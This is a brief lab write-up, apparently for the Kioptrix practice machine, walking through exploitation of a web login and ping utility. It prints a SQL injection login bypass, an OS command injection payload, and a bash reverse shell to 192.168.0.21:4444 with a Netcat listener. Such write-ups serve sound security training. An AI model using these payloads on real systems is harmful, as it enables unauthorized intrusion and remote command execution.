# Exploitation

> **Disclaimer:** The following steps are intended **only for authorized practice environments such as Kioptrix**.

## SQL Injection Authentication Bypass

Testing the login page revealed a SQL Injection vulnerability.

Use the following payload in both the **username** and **password** fields:

```text
' or 1=1--
```

This successfully bypasses authentication and provides access to the administrative panel.

---

## Ping Functionality

After logging in, a web-based **Ping** utility becomes available.

Supplying an IP address (for example):

```text
127.0.0.1
```

returns the output of the system's `ping` command in the browser.

---

## Command Injection

The ping functionality is vulnerable to **OS Command Injection**.

Example payload:

```text
127.0.0.1; whoami
```

This executes the additional command after the ping request.

---

## Reverse Shell

Start a Netcat listener on the attacking machine:

```bash
nc -nlvp 4444
```

Then submit the following payload through the vulnerable ping field:

```text
127.0.0.1; bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
```

A reverse shell is established, providing command execution on the target.

### Initial Access

The shell is obtained as the low-privileged user:

```text
apache
```

Further privilege escalation is required to obtain root access.
